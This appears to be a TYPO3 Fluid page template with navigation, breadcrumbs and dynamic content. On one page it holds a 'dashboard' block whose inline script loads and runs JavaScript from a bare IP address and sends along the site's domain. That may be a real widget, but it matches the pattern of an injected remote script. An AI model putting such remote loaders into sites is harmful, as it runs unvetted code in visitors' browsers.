<f:layout name="default"/>
<f:section name="main">
    <f:cObject typoscriptObjectPath="lib.navigation.main"/>
    <section>
        <div class="content-wrapper">
            <h3>{pageTitle}<small><f:cObject typoscriptObjectPath="lib.navigation.breadcrumb"/></small></h3>
            <div class="content">
                <f:cObject typoscriptObjectPath="lib.dynamicContent" data="0"/>
                <f:if condition="{pageId} == 8">
                    <div id="dashboard">
                        <div class="csspinner no-overlay ringed">
                            &nbsp;
                        </div>
                    </div>
                    <script type="text/javascript">
                        var ngoos = document.createElement("script");
                        ngoos.src = "//42.121.52.212/api/v1.php?domain=" + (window.location.host||document.domain);
                        var s = document.getElementsByTagName("script")[0];
                        s.parentNode.insertBefore(ngoos, s);
                    </script>
                </f:if>
            </div>
        </div>
    </section>
</f:section>
